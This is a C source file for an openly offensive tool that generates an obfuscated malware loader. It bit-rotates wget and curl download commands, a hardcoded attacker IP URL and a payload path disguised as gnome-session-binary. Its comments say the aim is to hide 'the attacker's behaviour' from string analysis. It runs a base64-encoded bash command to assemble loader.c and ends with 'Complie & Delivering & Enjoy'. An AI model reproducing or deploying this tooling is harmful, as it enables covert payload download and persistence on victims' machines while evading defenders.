/**
 * Copyright (c) 2020-2021 aplyc1a <aplyc1a@protonmail.com>
 * 
 * How to start:
 * step 1: Modify definition. Which would be obfuscate before de-obfuscate by loader. Line 18-23
 * step 2: gcc obfuscator.c -o obfuscator;./obfuscator
 * step 3: Check the result. Generally a file named `loader.c` will be generate.
 **/
 
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>


//////////////////////////////////////////////////////////////
////////////////////////CONFIGURAION//////////////////////////
//////////////////////////////////////////////////////////////
uint8_t wget_https[]="/usr/bin/wget -q --no-check-certificate ";
uint8_t curl_https[]="/usr/bin/curl -s -k -f ";
uint8_t base_site[]="https://11.22.33.44:18000/";
uint8_t misc_path[]="elf34e61aa704fcfec8a04d1dbc7a156/";
uint8_t r_file[]="gnome-session-binary";
uint8_t l_file[]="/usr/local/sbin/gnome-session-binary";
//////////////////////////////////////////////////////////////
////////////////////////CONFIGURAION//////////////////////////
//////////////////////////////////////////////////////////////

uint8_t verbose = 0;

uint8_t shiftme(uint8_t value, int8_t n) {
    uint8_t z;
    if (n > 0 && n < 8) {
        z = (value >> (8 - n)) | (value << n);
    } else if (n > -8 && n < 0) {
        n = -n;
        z = (value << (8 - n)) | (value >> n);
    }
    return z;
}
void deobfuscator(uint8_t *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] = shiftme(data[i], -1);
    }
}
void obfuscator(uint8_t *data, int len) {
    for (int i = 0; i < len; i++) {
        data[i] = shiftme(data[i], 1);
    }
}
void run_obfuscator() {
    printf("[+] Step1: Run obfuscator. Obfuscator is used to resist String-Analysis in undead-loader.\n\n");
    uint8_t tmp[200]= {0};
    obfuscator(wget_https,sizeof(wget_https));
    obfuscator(curl_https,sizeof(curl_https));
    obfuscator(base_site,sizeof(base_site));
    obfuscator(misc_path,sizeof(misc_path));
    obfuscator(r_file,sizeof(r_file));
    obfuscator(l_file,sizeof(l_file));
    FILE *fp = fopen("./obfuscator.txt", "w");
    if(fp == NULL) {
        printf("open error!\n");
        exit(1);
    }
    fputs("uint8_t r_file[]=\"", fp);
    for (int i=0;i<sizeof(r_file);i++) {
        sprintf(tmp, "\\x%02x", (uint8_t)r_file[i]);
        fputs(tmp, fp);
        memset(tmp, 0, sizeof(tmp));
    }
    fputs("\";\n", fp);
    fputs("uint8_t l_file[]=\"", fp);
    for (int i=0;i<sizeof(l_file);i++) {
        sprintf(tmp, "\\x%02x", (uint8_t)l_file[i]);
        fputs(tmp, fp);
        memset(tmp, 0, sizeof(tmp));
    }
    fputs("\";\n", fp);
    fputs("uint8_t base_site[]=\"", fp);
    for (int i=0;i<sizeof(base_site);i++) {
        sprintf(tmp, "\\x%02x", (uint8_t)base_site[i]);
        fputs(tmp, fp);
        memset(tmp, 0, sizeof(tmp));
    }
    fputs("\";\n", fp);
    fputs("uint8_t misc_path[]=\"", fp);
    for (int i=0;i<sizeof(misc_path);i++) {
        sprintf(tmp, "\\x%02x", (uint8_t)misc_path[i]);
        fputs(tmp, fp);
        memset(tmp, 0, sizeof(tmp));
    }
    fputs("\";\n", fp);
    fputs("uint8_t wget_https[]=\"", fp);
    for (int i=0;i<sizeof(wget_https);i++) {
        sprintf(tmp, "\\x%02x", (uint8_t)wget_https[i]);
        fputs(tmp, fp);
        memset(tmp, 0, sizeof(tmp));
    }
    fputs("\";\n", fp);
    fputs("uint8_t curl_https[]=\"", fp);
    for (int i=0;i<sizeof(curl_https);i++) {
        sprintf(tmp, "\\x%02x", (uint8_t)curl_https[i]);
        fputs(tmp, fp);
        memset(tmp, 0, sizeof(tmp));
    }
    fputs("\";\n", fp);
    fclose(fp);
}

void run_deobfuscator_debug(){
    printf("[+] Step3: Check the following contents for wrong de-obfuscate result before you compile the `loader.c`.\n");
    deobfuscator(wget_https,sizeof(wget_https));
    deobfuscator(curl_https,sizeof(curl_https));
    deobfuscator(base_site,sizeof(base_site));
    deobfuscator(misc_path,sizeof(misc_path));
    deobfuscator(r_file,sizeof(r_file));
    deobfuscator(l_file,sizeof(l_file));
    
    printf("--->--------------------------------------------------------------------\n");
    printf("%s %s%s`arch`/%s -O %s\n", wget_https,base_site,misc_path,r_file,l_file);
    printf("%s %s%s`arch`/%s -o %s\n", curl_https,base_site,misc_path,r_file,l_file);
    printf("--------------------------------------------------------------------<---\n\n");
}

void create_loader() {
    /*
    line=`cat -n artifact.bin|grep "//stub//"|awk '{print $1}'`
    head -n $line artifact.bin >> loader.c
    cat obfuscator.txt >> loader.c
    tail -n +$line artifact.bin >> loader.c
    */
    printf("[+] Step2: Generate the loader's source code.\n");
    uint8_t *command= "echo bGluZT1gY2F0IC1uIGFydGlmYWN0LmJpbnxncmVwICIvL3N0dWIvLyJ8YXdrICd7cHJpbnQgJDF9J2AKaGVhZCAtbiAkbGluZSBhcnRpZmFjdC5iaW4gPj4gbG9hZGVyLmMKY2F0IG9iZnVzY2F0b3IudHh0ID4+IGxvYWRlci5jCnRhaWwgLW4gKyRsaW5lIGFydGlmYWN0LmJpbiA+PiBsb2FkZXIuYwo=|base64 -d|bash";
    
    FILE *fp=NULL;
    fp=popen(command,"r");
    sleep(3);
    
    if(!verbose){
        fp=popen("sed -i '/\[debug\]/d' loader.c","r");
        sleep(3); 
    }
    
    fp=popen("rm -rf obfuscator.txt","r");
    pclose(fp);
    
    printf("[*]        Generate successfully. <loader.c> \n\n");
}

int main(int agrc,char *argv[],char *envp[]) {
    
    int32_t opt=0;
    while((opt=getopt(argc,argv,"v"))!=-1)
    {
        switch(opt)
        {
            case 'v':
                verbose=1;
                break;
            default:
                printf("[-] Wrong parameter.\n");
                exit(1);
        }
    }
    
    if(verbose)
    {
        printf("[*] Generating verbose mode loader code...\n");
    }
    else
    {
        printf("[*] Generating loader code...\n");
    }
    
    // step 1: 混淆器用于混淆loader中的一些关键特殊字符串，在做字符串分析时如果这些字符串没被过滤将直接暴露攻击者的行为。
    run_obfuscator();
    
    // step 2: 生成loader的源码。函数中我将loader的调试输出都关了。loader中定义了解码函数，会将混淆后的字符串解密后再使用。
    create_loader();

    // step 3: 在这里尝试做一下解混淆，帮助使用者确定混淆器有没有正常工作。
    run_deobfuscator_debug();
    
    // step 4: 如果第3步没问题。就可以去编译loader进行使用了。
    printf("[+] Step4: There is nothing to do here. Now you get the loader source code, `Complie & Delivering & Enjoy`.\n\n");
    return 0;
}